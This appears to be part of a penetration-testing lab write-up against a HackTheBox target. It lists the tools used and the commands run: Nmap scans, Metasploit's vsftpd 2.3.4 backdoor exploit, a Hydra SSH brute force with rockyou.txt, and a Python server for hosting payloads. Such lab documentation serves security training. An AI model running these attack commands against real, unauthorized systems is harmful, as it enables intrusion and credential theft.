##Tools Used
Tool	          Purpose                     	Platform
Kali Linux	   	Penetration testing OS    	  Linux
Metasploit    	Exploitation framework	      CLI/GUI
OpenVAS		      Vulnerability scanning	      Web-based
Burp Suite Pro	Web application testing	      Cross-platform
Nmap		        Network discovery & scanning	CLI
Hydra		        Credential brute-forcing	    CLI
John the Ripper Password cracking           	CLI
HackTheBox VM 	Target environment	          Virtual Machine


##Commands Used
Tool	      Command	                                           Purpose
Nmap       	nmap -sS -sV -O -p- 192.168.1.200                  Full TCP port scan
Nmap	      nmap --script vuln 192.168.1.200	                 Vulnerability scan
Metasploit	msfconsole	                                       Start framework
Metasploit	use exploit/unix/ftp/vsftpd_234_backdoor	         Load VSFTPD exploit
Metasploit	set RHOSTS 192.168.1.200	                         Set target IP
Metasploit	exploit	                                           Execute exploit
OpenVAS    	gvm-cli socket --xml "<get_tasks/>"                List scan task
Burp Suite	Proxy → Intercept → Enable	                       Start interception
Hydra	      hydra -l admin -P rockyou.txt ssh://192.168.1.200	 SSH brute force
System	    python3 -m http.server 80	                         Host payload/scripts
